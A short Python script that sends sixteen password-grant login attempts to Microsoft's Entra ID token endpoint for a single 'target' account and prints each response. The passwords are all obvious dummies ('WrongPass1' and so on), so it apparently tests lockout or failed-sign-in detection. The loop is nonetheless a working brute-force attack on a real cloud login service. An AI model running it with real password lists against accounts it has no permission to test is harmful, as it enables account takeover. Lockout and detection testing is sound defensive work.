import requests
import time

tenant_id = '1314b35d-bcab-4ece-b99b-67371e57f0a1'
client_id = 'ec7b3a07-9969-4dbc-8022-1ac513c66909'
login_url = f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token'
username = 'target@chrisbbehrenshotmail466.onmicrosoft.com'
passwords = ['WrongPass1', 'WrongPass2', 'WrongPass3', 'WrongPass4', 'WrongPass5', 'WrongPass6', 'WrongPass7', 'WrongPass8', 'WrongPass9', 'WrongPass10', 'WrongPass11', 'WrongPass12', 'WrongPass13', 'WrongPass14', 'WrongPass15', 'WrongPass16']

for password in passwords:
    data = {
        'client_id': client_id,
        'scope': 'User.Read',
        'grant_type': 'password',
        'username': username,
        'password': password
    }
    response = requests.post(login_url, data=data)
    print(f"Attempt with {password}: {response.status_code} - {response.text}")